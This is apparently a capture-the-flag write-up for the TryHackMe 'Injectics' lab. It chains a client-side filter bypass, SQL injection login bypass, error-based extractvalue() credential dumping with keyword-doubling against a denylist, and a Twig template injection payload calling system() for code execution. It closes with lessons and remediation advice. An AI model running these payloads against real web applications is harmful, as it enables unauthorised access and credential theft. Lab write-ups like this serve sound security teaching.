# Injectics — TryHackMe Writeup

> **Room:** [Injectics](https://tryhackme.com/room/injectics) · **Difficulty:** Medium
> **Category:** Web / Injection
> **Author of writeup:** 0xnyx
> **Goal:** Beat the login filters to get a session, SQLi the admin creds out for flag 1, then SSTI the admin panel for RCE and flag 2.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/injectics), **no flags are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**. The whole box is about slipping a payload past a filter — a client-side JS filter on the login, then a server-side denylist (strips spaces, `=`, quotes, parens, commas and `or`/`and`/`union`/`select`).

---

## Step 1 — Content discovery (find the hidden surface)

**Do** — Only web is open, so map the files.

```bash
feroxbuster -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php
```

**You get**

```
200  /login.php
200  /functions.php      <- the login handler the form POSTs to
200  /dashboard.php
301  /flags/             <- objectives live as files on disk
200  /phpmyadmin/
200  /adminLogin007.php  <- a second admin login nothing links to
```

**Why / what next** — `/adminLogin007.php` is the flag-1 target (a hidden privileged login). `/flags/` being a directory means flag 2 is a file → we'll need **code execution**, not just a DB read. `/phpmyadmin/` and a later `mail.log` `superadmin` cred are both dead ends (no default creds; the leaked password is already rotated).

---

## Step 2 — Login bypass (client filter + SQLi)

**Do** — The form blocks characters as you type, but that's `script.js` in the browser. POST straight to the handler to skip it.

```bash
curl -si -X POST http://<TARGET>/functions.php --data "mail=' OR 'x'='x'#&pass=x" | grep -i location
```

**You get**

```
Location: dashboard.php
```

**Why / what next** — The password check in this build doesn't gate anything, so any `mail` value returning a row logs us in. `' OR 'x'='x'` is always-true and `#` comments out the rest. We use `'x'='x'` not `1=1` because the filter strips `=` in the numeric form. We're in as the first `users` row (a `dev` account) — but that's **not** admin.

---

## Step 3 — Flag 1 (error-based SQLi → admin panel)

**Do** — `edit_leaderboard.php` takes a `rank` param. Test it with a stray quote.

```bash
curl -s "http://<TARGET>/edit_leaderboard.php?rank=1'"
```

**You get**

```
... XPATH syntax error ...
```

**Why / what next** — Errors render but query results don't → **error-based** extraction with `extractvalue()`, which leaks our subquery output inside the XPath error. The denylist eats `select`/`password`, so we **double the keyword** (`SSELECTELECT` → filter removes inner `SELECT` → `SELECT`; `passwoorrd` → `password`).

**Do** — Pull the admin creds out of `users`.

```bash
curl -s "http://<TARGET>/edit_leaderboard.php?rank=1 AND \
extractvalue(1,concat(0x7e,(SSELECTELECT concat(mail,0x3a,passwoorrd) FROM users LIMIT 1)))"
```

**You get**

```
... XPATH syntax error: '~admin@injectics.thm:[REDACTED]' ...
```

**Why / what next** — The `0x7e` (`~`) is the invalid XPath char that forces the error and drags the creds along. Log in at `/adminLogin007.php` with them → admin dashboard → **flag 1**.

> **Deploy note:** on the fresh deploy, `rank` also stripped parens/commas. The working alternative was the leaderboard **update** form's `gold` field — the browser URL-encodes the payload and the filter runs *before* the server decodes it, so a stacked `UPDATE` (overwriting `leaderboard.country` with a creds subquery) slips through and prints on the leaderboard. Same dump, different hole.

---

## Step 4 — Flag 2 (Twig SSTI → RCE)

**Do** — Flag 2 is a file under `/flags/`, so we need execution. Probe the admin profile **first-name** field.

```
first name = {{7*7}}     -> 49
first name = {{7*'7'}}   -> 49
```

**You get** — `{{7*7}}` renders `49` (evaluated, not echoed). `{{7*'7'}}` giving `49` (not `7777777`) confirms **Twig/PHP**, not Jinja2.

**Why / what next** — Twig on PHP reaches `system()` through its filter chain. Set the first-name field to run the command and read the file:

```
{{ ['cat /var/www/html/flags/<flagfile>']|map('system')|join }}
```

**You get** — The profile page re-renders with the file contents inline → **flag 2**.

**Why / what next** — If single quotes get mangled by the SQL layer on the way in, hex-encode the command or use double quotes so Twig gets clean syntax.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | feroxbuster | Hidden `/adminLogin007.php` + `/flags/` |
| 2 | `' OR 'x'='x'#` (client filter + SQLi) | Low-priv session |
| 3 | `extractvalue()` + keyword-doubling | Admin creds → panel (flag 1) |
| 4 | Twig SSTI `{{…|map('system')…}}` | RCE → flag file (flag 2) |

## Lessons

- Client-side JS filters are UX only — `curl`/Burp skips them entirely.
- Keyword denylists fall to **doubling** (`SSELECTELECT` → `SELECT`).
- Error-visible app + no result output = reach for `extractvalue()` error-based SQLi.
- A filter that runs **before** URL-decoding can be fed URL-encoded payloads (the `gold`-field trick).
- Fingerprint the template engine (`{{7*7}}` / `{{7*'7'}}`) before firing an RCE payload.

## Remediation

- Parameterised queries everywhere — kills the login bypass and both SQLi sinks regardless of the filter.
- Make the password check actually run (constant-time verify).
- Pass profile values as template **data**, never concatenate into template source — closes the SSTI.
- Drop the hidden admin panel; keep `mail.log` out of the web root.

---

*Write-up for [TryHackMe — Injectics](https://tryhackme.com/room/injectics).*
